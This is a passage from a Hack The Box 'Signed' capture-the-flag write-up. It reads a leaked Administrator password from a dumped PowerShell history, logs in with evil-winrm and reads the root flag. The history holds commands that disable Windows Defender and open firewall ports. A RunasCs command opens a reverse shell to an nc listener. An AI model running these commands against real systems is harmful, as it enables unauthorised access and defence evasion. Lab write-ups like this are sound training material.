MSSQLSERVER\r\nNew-NetFirewallRule -DisplayName "SQL Server TCP 1433" -Direction Inbound -Protocol TCP -LocalPort 1433 -Action Allow -Profile any\r\nget-service -Name MSSQLSERVER\r\nSet-Service mssqlserver -StartupType automatic\r\nget-service -Name MSSQLSERVER\r\nStart-Service mssqlserver\r\nwhoami /all\r\nsecedit /export /cfg C:\\windows\\tasks\\cur.inf\r\nnotepad C:\\windows\\tasks\\cur.inf\r\nsecedit /configure /db C:\\Windows\\Security\\local.sdb /cfg C:\\windows\\tasks\\cur.inf /areas USER_RIGHTS\r\nsc.exe privs MSSQLSERVER SeChangeNotifyPrivilege/SeCreateGlobalPrivilege/SeIncreaseWorkingSetPrivilege/SeIncreaseQuotaPrivilege\r\nRestart-Service mssqlserver\r\n$zone = "DC=signed.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=signed,DC=htb"`\n$account = Get-ADUser mssqlsvc`\n`\n$acl = Get-ACL "AD:$zone"`\n$identity = New-Object System.Security.Principal.NTAccount($account.SamAccountName)`\n`\n$rights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"`\n$inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All`\n$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity,$rights,"Allow",$inheritance)`\n`\n$acl.AddAccessRule($ace)`\nSet-ACL -ACLObject $acl "AD:$zone"\r\nEnable-PSRemoting -Force\r\n$FQDN = "dc01.signed.htb"`\n$cert = New-SelfSignedCertificate -DnsName $FQDN -CertStoreLocation Cert:\\LocalMachine\\My -KeyExportPolicy Exportable -FriendlyName "WinRM HTTPS $FQDN" -NotAfter (Get-Date).AddYears(5)`\n$thumb = ($cert.Thumbprint).Replace(" ","")`\nwinrm create winrm/config/Listener?Address=*+Transport=HTTPS "@{Hostname=`"$FQDN`";CertificateThumbprint=`"$thumb`"}"\r\ntry { winrm delete winrm/config/Listener?Address=*+Transport=HTTP } catch {}\r\nSet-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force`\nnetsh advfirewall firewall add rule name="WinRM over HTTPS (5986)" dir=in action=allow protocol=TCP localport=5986`\nRestart-Service WinRM -Force\r\nnetstat -ano -p tcp\r\nwinrm enumerate winrm/config/listener\r\nwinrm get winrm/config\r\nNew-NetFirewallRule -DisplayName "Allow RDP - Any IP" ``\n    -Direction Inbound ``\n    -Protocol TCP ``\n    -LocalPort 3389 ``\n    -Action Allow ``\n    -Profile Any ``\n    -Enabled True ``\n    -Description "Allow RDP access from any IP address (testing only)"\r\nSet-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -DefaultOutboundAction Allow\r\nNew-NetFirewallRule -DisplayName "Allow DNS - Domain Only" ``\n    -Direction Inbound ``\n    -Protocol UDP ``\n    -LocalPort 53 ``\n    -Action Allow ``\n    -Profile Any ``\n    -Description "Allow DNS queries from domain network"\r\nGet-NetFirewallRule -Direction Inbound | Where-Object {$_.DisplayName -notlike "Allow *"} | Disable-NetFirewallRule\r\nNew-NetFirewallRule -DisplayName "Allow MSSQL - Any IP" ``\n    -Direction Inbound ``\n    -Protocol TCP ``\n    -LocalPort 1433 ``\n    -Action Allow ``\n    -Enabled True ``\n    -Profile Any ``\n    -Description "Allow MSSQL access from any IP address"\r\nls \\users\\\r\ncd .\\Desktop\\\r\nnotepad root.txt\r\nnotepad C:\\Users\\mssqlsvc\\Desktop\\user.txt\r\ndir\r\ncmd /c "C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All\r\npowershell -command \'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true\' \r\ndir\r\ncd \\windows\\takss\r\ncd C:\\windows\\Tasks\\\r\ndir\r\ndel *\r\ndir\r\ncd \\\r\ndir\r\ncd users\r\ncd .\\Administrator\\Desktop\\\r\nnotepad cleanup.ps1\r\ncls\r\n$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File C:\\Users\\Administrator\\Documents\\cleanup.ps1"`\n$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 365)`\n$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable`\nRegister-ScheduledTask -TaskName "Clean_DNS_Task" -Action $Action -Trigger $Trigger -Settings $Settings -User "SIGNED\\Administrator" -Password "Welcome1"\r\ncd ..\\Documents\\\r\nnotepad restart.ps1\r\nexplorer .\r\ndir ..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset\r\nSet-Service TermService -StartupType disabled\r\nexit\r\nGet-NetConnectionProfile\r\nnltest /dsgetdc:signed.htb\r\nwusa /uninstall /kb:5065428\r\niwr http://10.10.11.90:81/vmt.exe -O vmt.exe\r\niwr http://10.10.14.62:81/vmt.exe -O vmt.exe\r\n.\\vmt.exe\r\ndel .\\vmt.exe\r\nmanage-bde -off c:\\\r\ndisable-bitlocker -mountpoint c:\\\r\npowershell iwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2024/06/windows10.0-kb5039217-x64_bc72f4ed75c6dd7bf033b823f79533d5772769a3.msu -O update.msu\r\n.\\update.msu\r\ndel .\\update.msu\r\ndir\r\niwr https://catalog.s.download/windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\niwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .\\updates.msu\r\n'
```

```powershell
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset
```

Got our password for `Administrator`. <br>
&rarr; `Th1s889Rabb!t`.

From here we can either `evil-winrm` straight to `Administrator` session.

```bash
└─$ sudo proxychains evil-winrm -i 127.0.0.1 -u Administrator -p 'Th1s889Rabb!t' -S -P 5986
[sudo] password for kali: 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5986  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/17/2025   3:17 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
84c0b0937ace65ef513c438409e55274
```

Or using [RunasCs](https://github.com/antonioCoco/RunasCs) as well and then reverse shell back.

> *Here is command to run [RunasCs](https://arttoolkit.github.io/wadcoms/RunasCs/) from `arttoolkit` or we can check out options and figure it out.*

Setup our listener.

```bash
└─$ rlwrap -cAr nc -lvnp 4455
listening on [any] 4455 ...
```

Now execute it.

```powershell
PS C:\Temp> .\RunasCs.exe Administrator Th1s889Rabb!t powershell -r 10.10.16.35:4455

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-6985c$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1140 created in background.
```


```bash
└─$ rlwrap -cAr nc -lvnp 4455
listening on [any] 4455 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.8.73] 57355
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
signed\administrator
PS C:\Windows\system32> cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir
dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       10/17/2025   3:17 AM             34 root.txt                                                              


PS C:\Users\Administrator\Desktop> type root.txt
type root.txt
84c0b0937ace65ef513c438409e55274
```

Got our shell in `Administrator` and take the `root.txt` flag.

> *As doing with windows machine, it is wide that if we got this way to escalated to `root`, there will still be another way to get there so that is why windows make ourself more fun and enjoyable during the frustrated part but keys takeways is really value for ourself as well. :>*

![result](/assets/img/signed-htb-season9/result.png)